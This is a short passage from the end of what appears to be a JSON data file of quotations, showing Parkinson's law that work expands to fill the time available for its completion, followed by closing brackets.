Work expands so as to fill the time available for its completion"

    }
  
]